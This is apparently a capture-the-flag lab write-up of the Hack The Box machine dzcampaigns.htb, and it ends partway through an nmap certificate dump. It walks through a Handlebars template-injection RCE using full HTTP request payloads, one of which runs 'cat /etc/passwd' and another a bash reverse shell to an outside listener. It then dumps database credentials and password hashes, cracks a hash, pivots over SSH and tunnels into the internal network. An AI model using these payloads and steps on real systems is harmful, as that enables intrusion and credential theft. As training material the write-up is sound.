### Nmap
```
nmap -sV -sC -vv 10.129.59.237

---OUTPUT---
Nmap scan report for 10.129.59.237
Host is up, received echo-reply ttl 127 (0.016s latency).
Scanned at 2026-07-28 04:42:48 EDT for 18s
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 127 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![[Pasted image 20260728044711.png]]

![[Pasted image 20260728045219.png]]

![[Pasted image 20260728045244.png]]

- Create a new user:
![[Pasted image 20260728045313.png]]
![[Pasted image 20260728045330.png]]

- Username : `test@test.com : test1ng@HTB`
![[Pasted image 20260728045442.png]]

- Create New charactrer:
![[Pasted image 20260728045534.png]]

- Add item to inventory:
![[Pasted image 20260728045623.png]]

- When creating new user I see something interesting we can use in Campaign messages, i.e, templates:
![[Pasted image 20260728052432.png]]

- Testing a few things I find if i use values like `{{this}}` the message for the new user does not show. Furthermore I try the payload `{{#if true}}yes{{/if}}` which prints out yes in the message. This confirms handlebar.js is running:
![[Pasted image 20260728052614.png]]

- I find a CVE for this : https://github.com/dinhvaren/cve-2026-33937
- from this we get a basic PoC which doesnt work initially. But if we read it thoroughly we find a note saying this:
```
Note on exploitation technique: Existing public PoCs (including the referenced one) achieve the injection via a NumberLiteral node combined with a lookup helper. This PoC confirms the same RCE primitive using a BooleanLiteral node combined with the log built-in helper, demonstrating that the type confusion is not limited to a single node type or helper function.
```

- So we can alter the payload to use the log helper instead.
- I intercept the packet where i enter a dummy campaign message and inject the SSTI and alter the request to include the PoC:
- Initially I test by checking `/etc/passwd`:
```
---REQUEST---
POST /character/15 HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://dzcampaigns.htb/dashboard
Cookie: dz.sid=s%3AxZgRr0F2iaRiLZl9IsGPXhQ63wRiOe3b.NZobnWaRrDCLUElgOc4E0lCrE4FLU%2FPs6XPyeep5%2BFI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 687

{
  "_csrf": "02abf7fa5538767c8a695664653f94f65d728ca9da948c5ee6fab19aa9fe3b74",
  "name": "test",
  "race": "test",
  "class": "test",
  "backstory": "test",
  "campaign_message": {
  "type": "Program",
  "body": [
    {
      "type": "MustacheStatement",
      "path": {
        "type": "PathExpression",
        "parts": ["log"]
      },
      "params": [
        {
          "type": "BooleanLiteral",
          "value": "{}, {hash: {}})) + process.mainModule.require('child_process').execSync('cat /etc/passwd') + Object(String(''"
        }
      ],
      "escaped": true,
      "loc": {
        "start": {},
        "end": {}
      } 
    }
  ]
}
}

---RESPONSE---
HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 31 Jul 2026 20:08:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 39
Connection: keep-alive
Location: /dashboard
Vary: Accept
Set-Cookie: dz.sid=s%3AxZgRr0F2iaRiLZl9IsGPXhQ63wRiOe3b.NZobnWaRrDCLUElgOc4E0lCrE4FLU%2FPs6XPyeep5%2BFI; Path=/; Expires=Sat, 01 Aug 2026 20:08:26 GMT; HttpOnly; SameSite=Lax

<p>Found. Redirecting to /dashboard</p>
```
![[Pasted image 20260731090853.png]]

- After sending it I see the output for `/etc/passwd`:
![[Pasted image 20260731090913.png]]

- Now I do the same but put in my revers shell payload:
```
---REQUEST---
POST /character/15 HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://dzcampaigns.htb/dashboard
Cookie: dz.sid=s%3AxZgRr0F2iaRiLZl9IsGPXhQ63wRiOe3b.NZobnWaRrDCLUElgOc4E0lCrE4FLU%2FPs6XPyeep5%2BFI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 687

{
  "_csrf": "02abf7fa5538767c8a695664653f94f65d728ca9da948c5ee6fab19aa9fe3b74",
  "name": "test",
  "race": "test",
  "class": "test",
  "backstory": "test",
  "campaign_message": {
  "type": "Program",
  "body": [
    {
      "type": "MustacheStatement",
      "path": {
        "type": "PathExpression",
        "parts": ["log"]
      },
      "params": [
        {
          "type": "BooleanLiteral",
          "value": "{}, {hash: {}})) + process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.16.41/9999 0>&1\"') + Object(String(''"
        }
      ],
      "escaped": true,
      "loc": {
        "start": {},
        "end": {}
      } 
    }
  ]
}
}
```

- I get a shell on my listener:
![[Pasted image 20260731091057.png]]

- Checking the IP I see it has an internal IP  `172.16.20.3`
![[Pasted image 20260731091134.png]]

- Checking open ports I see mysql is runing:
![[Pasted image 20260731091222.png]]

- Checking the environment variables I see credentials for the database:
![[Pasted image 20260731091329.png]]
```
darkzero@SRV01:~$ env
env
DB_PASSWORD=C4ntFindMyDMpass!
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
PWD=/opt/DarkZero_Campaigns
LOGNAME=darkzero
PORT=8081
SYSTEMD_EXEC_PID=831
NODE_ENV=production
DB_USER=darkzero
HOME=/opt/DarkZero_Campaigns
LANG=en_US.UTF-8
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/darkzero_campaigns.service/memory.pressure
INVOCATION_ID=c20390afa6044189a678d1720fe4a532
DB_HOST=localhost
USER=darkzero
SESSION_SECRET=DarkSession312
SHLVL=2
DB_NAME=darkzero_campaigns
JOURNAL_STREAM=8:9290
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
```

- I first get a better shell so get sql outputs properly:
```
python3 -c 'import pty;pty.spawn("/bin/bash")';
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
![[Pasted image 20260731091733.png]]

- Then using the following commands I grab the password hashes of the users:
```
mysql -u darkzero -p -h localhost darkzero_campaigns
USE darkzero_campaigns;
SELECT * FROM users;

---OUTPUT---
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | test@test.com         | test     | $2b$10$L9wCyWJSlmHvA0ExZf7BRu5VyXQU0Czc5/XnTPYQG6LTffAx7Jmj2 | player | 2026-07-31 19:42:50 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
```
![[Pasted image 20260731091706.png]]

- I grab josh's hash and manage to crack it with john: `Rangers1`
```
john josh.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Rangers1         (?)     
1g 0:00:02:06 DONE (2026-07-31 09:22) 0.007929g/s 214.3p/s 214.3c/s 214.3C/s babyboys..DAYANA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![[Pasted image 20260731092249.png]]


- I can now ssh to the target as user josh:
```
ssh josh@dzcampaigns.htb
> Rangers1
```
![[Pasted image 20260731092423.png]]

- I create a tunnel initially with ligolo to be able to access the internal network:
```
---LOCAL-MACHINE---
./proxy -selfcert -laddr 0.0.0.0:9000
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
sudo ip route add 172.16.20.0/24/32 dev ligolo

---ON-TARGET---
./agent -connect 10.10.16.41:9000 -ignore-cert

---ON-LOCAL-AGAIN-LIGOLO SESSION--
session
> 1
> start
```
![[Pasted image 20260731101517.png]]

- I then did an nmap scan on the internal network:
```
nmap -sV -sC -vv 172.16.20.0/24

---OUTPUT---
Nmap scan report for DC01.darkzero.htb (172.16.20.1)
Host is up, received echo-reply ttl 64 (0.041s latency).
Scanned at 2026-07-31 10:14:35 EDT for 217s
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 64 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
88/tcp   open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2026-07-31 21:16:36Z)
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:36:38
| Not valid after:  2106-05-21T21:36:38
| MD5:     67a3 b3f2 5f78 5903 a6b9 1a67 15c8 3cf0
| SHA-1:   0c97 6d7b 05f8 5fde 99ef 074a e3fa 7cee 1b52 a9ec
| SHA-256: 02dd babd 3f89 e244 ef2a df0f d606 cf65 1374 e007 41cd 82b8 454d 4a90 ef01 a87f
| -----BEGIN CERTIFICATE-----
| MIIHADCCBOigAwIBAgITQAAAAAYgsZ/mDIhTuQABAAAABjANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwIBcNMjYwNTIxMjEzNjM4WhgP
| MjEwNjA1MjEyMTM2MzhaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDvXTQJY+f46ZITlXa/MZDJlYx4kjoBgeRvDDubNz7UWYBseICT8VPRW61vXqml
| MOo/0bn1De6zJyk4v2xUIihpa6phXL3A0ZEll14FOvvfFLqfh7buBQ3zyPYHE02f
| JinmRMXmxd/xa1A7dAr9us+xGGMgDzAPrklbWb4EZRW0cQ8AJFxSrRO8HP40yONi
| 2nQ+sx3eDQIK7csicQ8WQpX9c8wjkgYlwspP2gfHJhQHGgVHNZfjB+kq41FJ/tka
| 76CSt3OeP54zoOfD+7s9qnTIwjgvU02jhgVypV8YxHDVez9Jfj9hOoWv8IERBltR
| Z3Fk3Gy+MA13DPM8/gyyLE1FAgMBAAGjggMlMIIDITA3BgkrBgEEAYI3FQcEKjAo
| BiArBgEEAYI3FQiClcRDgYXaNIG1lSvTgmWH0aIWgXcBIQIBbgIBADAyBgNVHSUE
| KzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYB
| BQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBRA6wDqJanV
| fJUMb/1LD1JELkumjTAfBgNVHSMEGDAWgBQo81NdtPHlIZgCM/J3Rnbb28hrXTCB
| zwYDVR0fBIHHMIHEMIHBoIG+oIG7hoG4bGRhcDovLy9DTj1kYXJremVyby1EQzAx
| LUNBKDEpLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3plcm8sREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAC
| hoGjbGRhcDovLy9DTj1kYXJremVyby1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMl
| MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
| PWRhcmt6ZXJvLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA3BgNVHREBAf8ELTArghFEQzAxLmRhcmt6
| ZXJvLmh0YoIMZGFya3plcm8uaHRigghkYXJremVybzBPBgkrBgEEAYI3GQIEQjBA
| oD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMjg5OTE5NTQxMC0xODQ4NTI0Nzgz
| LTE1NDc3Njg1MTUtMTAwMDANBgkqhkiG9w0BAQsFAAOCAgEAJ76Bhk94n5s9KjOE
| WmxagrhYZhs6z4PiZacSd5BGHN+thY0IAfwjXE3E/gq81XIkCYFmhz5eg+FtTu4v
| dhU8uOH2l4JKVRCqLtcxcrZGV+9KdFeuhq+x6OJlKrQqYkXtz8NPeliJmFcs+3Mx
| jLWumwt4Nsb9Y7yBq1H8gmY1T+AvYPg2AsxrlsFx2vqhpHm4CtceMGgUyxTYC11u
| OG8ylsWnKJqG9paFIJeg95xL0DSgawpUyQowcJcDhT9m3ZrFn1sa+TtCk0+RM9cf
| DRO+jYpDH+q7sodGYOHSkEBEu+mQa/0sYYkQP3rBk51zMiUepdwjJ36eSuDnm03/
| jWlpxqfltCgV26GL5wsD2K57Sb1siaaiIHHLUmW9dO4/Dp1K1mBJ7VC3DMgaF30L
| aZwd4oKz/5W1WBsW7NnEdpyGqCp0bZUNFiq0SF91CS6ZeGr1UFINNuajk6Nwzb8z
| 3MwUfX0JW0T7X6xH7ygpysyafsBdJ1SHfUgYo2a31nVFaSU0avANSxUhYTdkZOby
| Y7+fLYx7n3SFg3W3bwBSOJHo7g+0pwnKnOvtijBcnBrXX7LRW9o6EpiZizoyGVFB
| Srw4WlVzxzuTq36NkBAc7uZxLA4xrX7COpJ5ct2RjholE36oCit7ou8QbhHueHRC
| v8DzcN0TVtP72F9vQB/0t2ppu9w=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 64
464/tcp  open  kpasswd5?     syn-ack ttl 64
593/tcp  open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:36:38
| Not valid after:  2106-05-21T21:36:38
| MD5:     67a3 b3f2 5f78 5903 a6b9 1a67 15c8 3cf0
| SHA-1:   0c97 6d7b 05f8 5fde 99ef 074a e3fa 7cee 1b52 a9ec
| SHA-256: 02dd babd 3f89 e244 ef2a df0f d606 cf65 1374 e007 41cd 82b8 454d 4a90 ef01 a87f
| -----BEGIN CERTIFICATE-----
| MIIHADCCBOigAwIBAgITQAAAAAYgsZ/mDIhTuQABAAAABjANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwIBcNMjYwNTIxMjEzNjM4WhgP
| MjEwNjA1MjEyMTM2MzhaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDvXTQJY+f46ZITlXa/MZDJlYx4kjoBgeRvDDubNz7UWYBseICT8VPRW61vXqml
| MOo/0bn1De6zJyk4v2xUIihpa6phXL3A0ZEll14FOvvfFLqfh7buBQ3zyPYHE02f
| JinmRMXmxd/xa1A7dAr9us+xGGMgDzAPrklbWb4EZRW0cQ8AJFxSrRO8HP40yONi
| 2nQ+sx3eDQIK7csicQ8WQpX9c8wjkgYlwspP2gfHJhQHGgVHNZfjB+kq41FJ/tka
| 76CSt3OeP54zoOfD+7s9qnTIwjgvU02jhgVypV8YxHDVez9Jfj9hOoWv8IERBltR
| Z3Fk3Gy+MA13DPM8/gyyLE1FAgMBAAGjggMlMIIDITA3BgkrBgEEAYI3FQcEKjAo
| BiArBgEEAYI3FQiClcRDgYXaNIG1lSvTgmWH0aIWgXcBIQIBbgIBADAyBgNVHSUE
| KzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYB
| BQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBRA6wDqJanV
| fJUMb/1LD1JELkumjTAfBgNVHSMEGDAWgBQo81NdtPHlIZgCM/J3Rnbb28hrXTCB
| zwYDVR0fBIHHMIHEMIHBoIG+oIG7hoG4bGRhcDovLy9DTj1kYXJremVyby1EQzAx
| LUNBKDEpLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3plcm8sREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAC
| hoGjbGRhcDovLy9DTj1kYXJremVyby1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMl
| MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
| PWRhcmt6ZXJvLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA3BgNVHREBAf8ELTArghFEQzAxLmRhcmt6
| ZXJvLmh0YoIMZGFya3plcm8uaHRigghkYXJremVybzBPBgkrBgEEAYI3GQIEQjBA
| oD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMjg5OTE5NTQxMC0xODQ4NTI0Nzgz
| LTE1NDc3Njg1MTUtMTAwMDANBgkqhkiG9w0BAQsFAAOCAgEAJ76Bhk94n5s9KjOE
| WmxagrhYZhs6z4PiZacSd5BGHN+thY0IAfwjXE3E/gq81XIkCYFmhz5eg+FtTu4v
| dhU8uOH2l4JKVRCqLtcxcrZGV+9KdFeuhq+x6OJlKrQqYkXtz8NPeliJmFcs+3Mx
| jLWumwt4Nsb9Y7yBq1H8gmY1T+AvYPg2AsxrlsFx2vqhpHm4CtceMGgUyxTYC11u
| OG8ylsWnKJqG9paFIJeg95xL0DSgawpUyQowcJcDhT9m3ZrFn1sa+TtCk0+RM9cf
| DRO+jYpDH+q7sodGYOHSkEBEu+mQa/0sYYkQP3rBk51zMiUepdwjJ36eSuDnm03/
| jWlpxqfltCgV26GL5wsD2K57Sb1siaaiIHHLUmW9dO4/Dp1K1mBJ7VC3DMgaF30L
| aZwd4oKz/5W1WBsW7NnEdpyGqCp0bZUNFiq0SF91CS6ZeGr1UFINNuajk6Nwzb8z
| 3MwUfX0JW0T7X6xH7ygpysyafsBdJ1SHfUgYo2a31nVFaSU0avANSxUhYTdkZOby
| Y7+fLYx7n3SFg3W3bwBSOJHo7g+0pwnKnOvtijBcnBrXX7LRW9o6EpiZizoyGVFB
| Srw4WlVzxzuTq36NkBAc7uZxLA4xrX7COpJ5ct2RjholE36oCit7ou8QbhHueHRC
| v8DzcN0TVtP72F9vQB/0t2ppu9w=
|_-----END CERTIFICATE-----
2179/tcp open  vmrdp?        syn-ack ttl 64
3268/tcp open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:36:38
| Not valid after:  2106-05-21T21:36:38
| MD5:     67a3 b3f2 5f78 5903 a6b9 1a67 15c8 3cf0
| SHA-1:   0c97 6d7b 05f8 5fde 99ef 074a e3fa 7cee 1b52 a9ec
| SHA-256: 02dd babd 3f89 e244 ef2a df0f d606 cf65 1374 e007 41cd 82b8 454d 4a90 ef01 a87f
| -----BEGIN CERTIFICATE-----
| MIIHADCCBOigAwIBAgITQAAAAAYgsZ/mDIhTuQABAAAABjANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwIBcNMjYwNTIxMjEzNjM4WhgP
| MjEwNjA1MjEyMTM2MzhaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDvXTQJY+f46ZITlXa/MZDJlYx4kjoBgeRvDDubNz7UWYBseICT8VPRW61vXqml
| MOo/0bn1De6zJyk4v2xUIihpa6phXL3A0ZEll14FOvvfFLqfh7buBQ3zyPYHE02f
| JinmRMXmxd/xa1A7dAr9us+xGGMgDzAPrklbWb4EZRW0cQ8AJFxSrRO8HP40yONi
| 2nQ+sx3eDQIK7csicQ8WQpX9c8wjkgYlwspP2gfHJhQHGgVHNZfjB+kq41FJ/tka
| 76CSt3OeP54zoOfD+7s9qnTIwjgvU02jhgVypV8YxHDVez9Jfj9hOoWv8IERBltR
| Z3Fk3Gy+MA13DPM8/gyyLE1FAgMBAAGjggMlMIIDITA3BgkrBgEEAYI3FQcEKjAo
| BiArBgEEAYI3FQiClcRDgYXaNIG1lSvTgmWH0aIWgXcBIQIBbgIBADAyBgNVHSUE
| KzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYD
| VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYB
| BQUHAwEwDAYKKwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBRA6wDqJanV
| fJUMb/1LD1JELkumjTAfBgNVHSMEGDAWgBQo81NdtPHlIZgCM/J3Rnbb28hrXTCB
| zwYDVR0fBIHHMIHEMIHBoIG+oIG7hoG4bGRhcDovLy9DTj1kYXJremVyby1EQzAx
| LUNBKDEpLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya3plcm8sREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAC
| hoGjbGRhcDovLy9DTj1kYXJremVyby1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMl
| MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
| PWRhcmt6ZXJvLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA3BgNVHREBAf8ELTArghFEQzAxLmRhcmt6
| ZXJvLmh0YoIMZGFya3plcm8uaHRigghkYXJremVybzBPBgkrBgEEAYI3GQIEQjBA
| oD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMjg5OTE5NTQxMC0xODQ4NTI0Nzgz
| LTE1NDc3Njg1MTUtMTAwMDANBgkqhkiG9w0BAQsFAAOCAgEAJ76Bhk94n5s9KjOE
| WmxagrhYZhs6z4PiZacSd5BGHN+thY0IAfwjXE3E/gq81XIkCYFmhz5eg+FtTu4v
| dhU8uOH2l4JKVRCqLtcxcrZGV+9KdFeuhq+x6OJlKrQqYkXtz8NPeliJmFcs+3Mx
| jLWumwt4Nsb9Y7yBq1H8gmY1T+AvYPg2AsxrlsFx2vqhpHm4CtceMGgUyxTYC11u
| OG8ylsWnKJqG9paFIJeg95xL0DSgawpUyQowcJcDhT9m3ZrFn1sa+TtCk0+RM9cf
| DRO+jYpDH+q7sodGYOHSkEBEu+mQa/0sYYkQP3rBk51zMiUepdwjJ36eSuDnm03/
| jWlpxqfltCgV26GL5wsD2K57Sb1siaaiIHHLUmW9dO4/Dp1K1mBJ7VC3DMgaF30L
| aZwd4oKz/5W1WBsW7NnEdpyGqCp0bZUNFiq0SF91CS6ZeGr1UFINNuajk6Nwzb8z
| 3MwUfX0JW0T7X6xH7ygpysyafsBdJ1SHfUgYo2a31nVFaSU0avANSxUhYTdkZOby
| Y7+fLYx7n3SFg3W3bwBSOJHo7g+0pwnKnOvtijBcnBrXX7LRW9o6EpiZizoyGVFB
| Srw4WlVzxzuTq36NkBAc7uZxLA4xrX7COpJ5ct2RjholE36oCit7ou8QbhHueHRC
| v8DzcN0TVtP72F9vQB/0t2ppu9w=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-21T21:36:38
| Not valid after:  2106-05-21T21:36:38
| MD5:     67a3 b3f2 5f78 5903 a6b9 1a67 15c8 3cf0
| SHA-1:   0c97 6d7b 05f8 5fde 99ef 074a e3fa 7cee 1b52 a9ec
| SHA-256: 02dd babd 3f89 e244 ef2a df0f d606 cf65 1374 e007 41cd 82b8 454d 4a90 ef01 a87f
| -----BEGIN CERTIFICATE-----
| MIIHADCCBOigAwIBAgITQAAAAAYgsZ/mDIhTuQABAAAABjANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya3pl
| cm8xGTAXBgNVBAMTEGRhcmt6ZXJvLURDMDEtQ0EwIBcNMjYwNTIxMjEzNjM4WhgP
